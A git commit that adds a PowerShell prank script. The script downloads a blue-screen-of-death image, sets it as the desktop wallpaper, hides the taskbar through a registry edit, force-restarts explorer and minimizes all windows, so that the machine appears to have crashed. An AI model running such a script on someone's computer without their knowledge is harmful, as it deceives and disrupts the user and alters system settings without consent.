b6df0dd40e9ac5a81746bc06c1d363edce2ff300
Krazycatt <104246713+Krazycatt@users.noreply.github.com>
2025-01-22 10:20:07 -0800

    Create wallpaper.ps1

---
+++ wallpaper.ps1
@@ -0,0 +1,39 @@
+$code = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+    
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    
+    [DllImport("user32.dll")]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+}
+'@
+
+Add-Type -TypeDefinition $code
+
+# Download BSOD image
+$imageUrl = "https://1.bp.blogspot.com/-fifVJfHz0-M/XDjD30_jWcI/AAAAAAAAAWM/HQ3Uv5ZHVCo37RbllK7v927DMYUl36TJgCLcBGAs/s1600/blue%2Bscreen%2Bof%2Bdeath%2Bwindow%2B10.png"
+$imagePath = "$env:USERPROFILE\Downloads\bsod.png"
+(New-Object System.Net.WebClient).DownloadFile($imageUrl, $imagePath)
+
+# Set as wallpaper
+[Win32]::SystemParametersInfo(0x0014, 0, $imagePath, 0x01 -bor 0x02)
+
+# Hide taskbar
+$RegPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3"
+$RegKey = (Get-ItemProperty -Path $RegPath).Settings
+$RegKey[8] = 3  # Hide taskbar
+Set-ItemProperty -Path $RegPath -Name Settings -Value $RegKey
+
+# Restart explorer to apply taskbar change
+Stop-Process -Name explorer -Force
+Start-Process explorer
+
+# Minimize all windows
+$shell = New-Object -ComObject "Shell.Application"
+$shell.MinimizeAll()
